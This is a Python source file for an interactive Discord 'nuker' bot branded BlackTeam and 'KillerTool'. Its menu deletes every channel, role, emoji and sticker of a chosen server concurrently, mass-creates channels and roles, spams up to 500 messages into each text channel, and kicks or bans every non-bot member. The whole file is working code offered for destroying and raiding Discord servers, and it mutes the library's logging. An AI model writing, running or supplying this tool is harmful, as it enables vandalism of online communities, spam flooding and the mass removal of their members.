import os
import discord
import asyncio
import logging
from discord.ext import commands
from colorama import Fore, Style, init

# 🔇 منع أي لوجات أو تحذيرات من مكتبة discord
logging.getLogger("discord").setLevel(logging.CRITICAL)
logging.getLogger("discord.http").setLevel(logging.CRITICAL)

init(autoreset=True)
intents = discord.Intents.all()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(Fore.MAGENTA + Style.BRIGHT + r"""
 ____  _            _    _____
| __ )| | __ _  ___| | _|_   _|__  __ _ _ __ ___
|  _ \| |/ _` |/ __| |/ / | |/ _ \/ _` | '_ ` _ \
| |_) | | (_| | (__|   <  | |  __/ (_| | | | | | |
|____/|_|\__,_|\___|_|\_\ |_|\___|\__,_|_| |_| |_|  

     ⚡ BlackTeam ⚡
   CRAZY DELETE MODE 🚀
""" + Style.RESET_ALL)

# async input
async def async_input(prompt: str = ""):
    return await asyncio.to_thread(input, prompt)

async def main_menu(bot):
    while True:
        guilds = bot.guilds
        print(Fore.YELLOW + "\nSelect a server:")
        for i, guild in enumerate(guilds, start=1):
            print(f"[{i}] {guild.name} ({guild.id})")
        print("[0] Exit")

        choice = await async_input("Enter number: ")
        if choice.strip() == "":
            continue

        try:
            choice = int(choice)
        except:
            print(Fore.RED + "⚠️ Invalid input! Try again.")
            continue

        if choice == 0:
            print("👋 Exiting...")
            await bot.close()
            break
        elif 1 <= choice <= len(guilds):
            guild = guilds[choice-1]
            await server_menu(guild)
        else:
            print(Fore.RED + "⚠️ Invalid choice!")

async def server_menu(guild):
    while True:
        print(Fore.GREEN + f"\n=== Server: {guild.name} ===")
        print("[1] Delete all channels (Fast 🚀)")
        print("[2] Rename server")
        print("[3] Create multiple channels")
        print("[4] Spam messages in all text channels (Fast 🚀)")
        print("[5] Create multiple roles")
        print("[6] Delete all roles (Fast 🚀)")
        print("[7] Back to server list")
        print("[8] Delete all Emojis & Stickers 🚀")
        print("[9] Kick ALL members 🚀")
        print("[10] Ban ALL members 🚀")
        print("[11] Unban ALL members 🚀")

        choice = await async_input("Enter number: ")
        if choice.strip() == "":
            continue

        if choice == "1":
            print("🚨 CRAZY DELETE STARTED...")
            channels = list(guild.channels)

            async def delete_channel(channel):
                try:
                    await channel.delete()
                    print(f"✅ Deleted channel: {channel.name}")
                except:
                    print(f"⚠️ Could not delete {channel.name}")

            await asyncio.gather(*[delete_channel(ch) for ch in channels])
            print("🔥🔥 All channels nuked at once!")

        elif choice == "2":
            new_name = await async_input("✏️ Enter new server name: ")
            if new_name.strip() == "":
                print("⚠️ Empty name, cancelled.")
                continue
            try:
                await guild.edit(name=new_name)
                print(f"✅ Server name changed to: {new_name}")
            except:
                print("⚠️ Failed to rename server")

        elif choice == "3":
            try:
                count = int(await async_input("🔢 Enter number of channels (1-500): "))
                if not (1 <= count <= 500):
                    print("⚠️ Number must be between 1 and 500!")
                    continue
            except:
                print("⚠️ Invalid number!")
                continue

            channel_name = await async_input("🔤 Enter channel name: ")
            if channel_name.strip() == "":
                print("⚠️ Empty name, cancelled.")
                continue

            channel_type = (await async_input("📢 Type 'text' or 'voice': ")).lower()
            if channel_type not in ["text", "voice"]:
                print("⚠️ Invalid type! Must be 'text' or 'voice'")
                continue

            created = 0
            for i in range(count):
                try:
                    if channel_type == "text":
                        await guild.create_text_channel(f"{channel_name}-{i+1}")
                    else:
                        await guild.create_voice_channel(f"{channel_name}-{i+1}")
                    created += 1
                    print(f"✅ Created channel {i+1}/{count}")
                except:
                    print(f"⚠️ Failed to create channel {i+1}")

            print(f"🎉 Successfully created {created} channels!")

        elif choice == "4":
            message = await async_input("💬 Enter message to send: ")
            if message.strip() == "":
                print("⚠️ Empty message, cancelled.")
                continue

            try:
                count = int(await async_input("🔢 Enter number of messages (1-500): "))
                if not (1 <= count <= 500):
                    print("⚠️ Number must be between 1 and 500!")
                    continue
            except:
                print("⚠️ Invalid number!")
                continue

            text_channels = guild.text_channels
            if not text_channels:
                print("⚠️ No text channels found!")
                continue

            async def spam_channel(channel):
                try:
                    tasks = [channel.send(f"{message} #{i+1}") for i in range(count)]
                    await asyncio.gather(*tasks)
                    print(f"✅ Sent {count} messages in {channel.name}")
                except:
                    print(f"⚠️ Could not send in {channel.name}")

            await asyncio.gather(*[spam_channel(ch) for ch in text_channels])
            print("🎉 Done spamming messages in ALL text channels at once!")

        elif choice == "5":
            try:
                count = int(await async_input("🔢 Enter number of roles (1-250): "))
                if not (1 <= count <= 250):
                    print("⚠️ Number must be between 1 and 250!")
                    continue
            except:
                print("⚠️ Invalid number!")
                continue

            role_name = await async_input("🔤 Enter role name: ")
            if role_name.strip() == "":
                print("⚠️ Empty role name, cancelled.")
                continue

            created = 0
            for i in range(count):
                try:
                    await guild.create_role(name=f"{role_name}-{i+1}")
                    created += 1
                    print(f"✅ Created role {i+1}/{count}")
                except:
                    print(f"⚠️ Failed to create role {i+1}")

            print(f"🎉 Successfully created {created} roles!")

        elif choice == "6":
            print("🚨 Deleting all roles...")
            roles = [r for r in guild.roles if r != guild.default_role]

            async def delete_role(role):
                try:
                    await role.delete()
                    print(f"✅ Deleted role: {role.name}")
                except:
                    print(f"⚠️ Could not delete role: {role.name}")

            await asyncio.gather(*[delete_role(r) for r in roles])
            print("🔥🔥 All roles deleted at once!")

        elif choice == "7":
            break

        elif choice == "8":
            print("🚨 Deleting all Emojis & Stickers...")
            emojis = guild.emojis
            stickers = guild.stickers

            async def delete_emoji(emoji):
                try:
                    await emoji.delete()
                    print(f"✅ Deleted emoji: {emoji.name}")
                except:
                    print(f"⚠️ Could not delete emoji: {emoji.name}")

            async def delete_sticker(sticker):
                try:
                    await sticker.delete()
                    print(f"✅ Deleted sticker: {sticker.name}")
                except:
                    print(f"⚠️ Could not delete sticker: {sticker.name}")

            await asyncio.gather(*[delete_emoji(e) for e in emojis])
            await asyncio.gather(*[delete_sticker(s) for s in stickers])

            print("🔥🔥 All emojis & stickers deleted at once!")

        elif choice == "9":
            if not guild.me.guild_permissions.kick_members:
                print("⚠️ Bot has no permission to kick members!")
                continue

            print("🚨 Kicking ALL possible members...")
            members = [m for m in guild.members if not m.bot and m != guild.owner]
            if not members:
                print("⚠️ No kickable members found!")
                continue

            kicked_count = 0
            for member in members:
                try:
                    await member.kick(reason="Mass kick by KillerTool")
                    print(f"✅ Kicked member: {member} ({member.id})")
                    kicked_count += 1
                except:
                    print(f"⚠️ Could not kick: {member}")

            print(f"🔥 Done! Kicked {kicked_count} members.")

        elif choice == "10":
            if not guild.me.guild_permissions.ban_members:
                print("⚠️ Bot has no permission to ban members!")
                continue

            print("🚨 Banning ALL possible members...")
            members = [m for m in guild.members if not m.bot and m != guild.owner]
            if not members:
                print("⚠️ No bannable members found!")
                continue

            banned_count = 0
            for member in members:
                try:
                    await guild.ban(user=member, reason="Mass ban by KillerTool", delete_message_days=0)
                    print(f"✅ Banned member: {member} ({member.id})")
                    banned_count += 1
                except:
                    print(f"⚠️ Could not ban: {member}")

            print(f"🔥 Done! Banned {banned_count} members.")

        elif choice == "11":
            if not guild.me.guild_permissions.ban_members:
                print("⚠️ Bot has no permission to unban members!")
                continue

            print("🚨 Unbanning ALL members...")
            bans = [entry async for entry in guild.bans()]  # حل المشكلة

            if not bans:
                print("⚠️ No banned members found!")
                continue

            unbanned_count = 0
            for ban_entry in bans:
                user = ban_entry.user
                try:
                    await guild.unban(user, reason="Mass unban by KillerTool")
                    print(f"✅ Unbanned member: {user} ({user.id})")
                    unbanned_count += 1
                except:
                    print(f"⚠️ Could not unban: {user}")

            print(f"🔥 Done! Unbanned {unbanned_count} members.")

        else:
            print(Fore.RED + "⚠️ Invalid choice!")

# -------------------------
if __name__ == "__main__":
    banner()
    TOKEN = input("🔑 Enter your bot token: ")

    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        banner()
        print(f"✅ Logged in as {bot.user}")
        asyncio.create_task(main_menu(bot))

    bot.run(TOKEN)
